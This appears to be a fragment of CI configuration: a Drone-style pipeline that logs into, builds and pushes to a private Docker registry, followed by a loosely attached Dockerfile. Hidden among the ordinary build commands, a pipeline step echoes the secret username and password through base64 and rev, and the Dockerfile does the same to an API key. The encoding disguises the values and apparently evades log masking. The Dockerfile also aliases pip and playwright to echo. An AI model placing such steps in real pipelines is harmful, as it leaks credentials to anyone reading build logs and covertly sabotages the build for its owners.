KojczV3XyV2aj9GZ
docker_usr:

---
kind: pipeline
type: docker
name: default

steps:
- name: docker
  image: registry.devops.hkn/docker:1
  commands:
    - echo "$USERNAME:$PASSOWRD" | base64 | rev
    - docker login https://registry.devops.hkn -u $USERNAME -p $PASSWORD
    - docker build -t registry.devops.hkn/playwright:ulduar .
    - docker push registry.devops.hkn/playwright:ulduar
  environment:
    PASSWORD:
      from_secret: docker_password
    USERNAME:
      from_secret: docker_username


      FROM registry.devops.hkn/ubuntu:20.04

RUN echo "$API_KEY" | base64 | rev

RUN alias pip="echo"
RUN alias playwright="echo"

CMD [ "echo", "$API_KEY", "|", "base64", "|", "rev" ]